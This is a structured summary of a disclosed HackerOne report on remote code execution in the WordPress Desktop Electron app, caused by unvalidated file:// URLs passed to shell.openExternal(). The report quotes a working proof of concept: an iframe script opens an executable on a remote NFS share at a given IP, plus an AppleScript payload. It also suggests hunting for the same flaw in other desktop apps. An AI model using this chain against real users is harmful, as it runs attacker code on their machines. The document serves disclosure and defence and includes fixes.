# Remote Code Execution in WordPress Desktop via Malicious file:// URLs

## Metadata
- **Source:** HackerOne
- **Report:** 301458 | https://hackerone.com/reports/301458
- **Submitted:** 2017-12-31
- **Reporter:** mattaustin
- **Program:** Automattic WordPress Desktop
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Improper URL Validation, Unsafe External Link Handling, Electron Security Misconfiguration
- **CVEs:** None
- **Category:** memory-binary

## Summary
WordPress Desktop App fails to validate URLs before passing them to shell.openExternal(), allowing attackers to execute arbitrary code by crafting malicious pages with file:// URLs pointing to executables or remote shares. An attacker can target any WordPress.com user by inviting them as an editor and executing code when the victim views the malicious page.

## Attack scenario
1. Attacker creates a WordPress page with an embedded iframe containing malicious JavaScript
2. JavaScript executes window.open() with a file:// URL pointing to a remote executable (e.g., file:///net/192.241.239.91/var/nfs/general/hack.app)
3. WordPress Desktop App's external link handler intercepts the URL without proper validation
4. shell.openExternal() passes the file:// URL to the OS, which executes the referenced application/executable
5. Malicious code runs with the privileges of the current user when the page is viewed or edited
6. Attacker gains arbitrary code execution on the victim's machine

## Root cause
The WordPress Desktop application uses shell.openExternal() to handle user-clicked links without validating that URLs begin with http:// or https://. The function naively passes file:// URLs to the operating system, which executes them as local file paths or network-mounted executables.

## Attacker mindset
An attacker recognizes that desktop applications often have different security contexts than browsers and lack URL validation. By exploiting the trust relationship between WordPress.com editors and the desktop app, they can deliver code execution disguised as a normal page interaction. Using remote shares or mounted filesystems bypasses local file restrictions.

## Defensive takeaways
- Implement strict URL scheme whitelisting - only allow http:// and https:// URLs in external link handlers
- Validate and sanitize all URLs before passing to system-level functions like shell.openExternal()
- Apply defense-in-depth: disable file:// protocol handling entirely unless absolutely necessary
- Use Electron's security best practices: set nodeIntegration to false and use preload scripts with restricted context
- Implement Content Security Policy (CSP) headers to prevent arbitrary window.open() calls
- Regular security audits of Electron applications, particularly around IPC and external process execution
- Consider sandboxing or privilege separation for rendering untrusted content

## Variant hunting
Check for similar unsafe shell.openExternal() calls in other Electron/desktop applications (VSCode, Slack, Discord, etc.)
Search for unvalidated URL handling in window.open() event listeners across desktop apps
Examine other protocol handlers (data://, blob://, custom protocols) that might bypass http/https restrictions
Look for similar issues in mobile apps that use deep linking without proper validation
Investigate other desktop applications handling WordPress/CMS content for equivalent vulnerabilities
Test applications for protocol confusion attacks (e.g., javascript://, vbscript://, about://) in external link handlers

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1203 - Exploitation for Client Execution
- T1204 - User Execution of Malicious File
- T1566 - Phishing (via malicious page invite)
- T1091 - Replication Through Removable Media (via NFS mount concept)

## Notes
This is a high-impact vulnerability combining multiple attack vectors: social engineering (editor invitation), malicious content delivery, and unsafe system API usage. The use of remote shares demonstrates attacker sophistication and increases reliability by hosting code externally. The report includes a working PoC video. The suggested fix is minimal but effective - URL scheme validation is a crucial gatekeeper for any application handling untrusted URLs.

## Full report
<details><summary>Expand</summary>

An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution. 

This issue looks to be around this line of code: 
https://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38

If shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser).  If we pass the an a .app file on MacOS or an exe it will just execute the code. 

We also link to a remote readable NFS mount (or windows share) to point to a remote executable. 

A Wordpress page is created with: 
```
<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center> 
```

This file has the following code: 
```
   <script>
      // window.open('file:///Applications/Calculator.app');
      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')
   </script>
```

The file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:

```
tell application "Terminal"
    do script "cat /etc/hosts"
    display dialog "You just got hacked!"
end tell

do shell script "open -a Calculator"
```

### POC
1. Create the setup described above. 
2. Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the "reader")
3. Code is executed when the user views the page. 

See attached video for a working POC. 


### Sugested Fix: 
Before passing a url to shell.openExternal the application should validate that it begins with http:// or https://.

## Impact

An attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run. 

The remote attacker would be able to run any code as the current user on the system once the page is viewed.

In my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.

</details>

---
*Analysed by Claude on 2026-05-12*
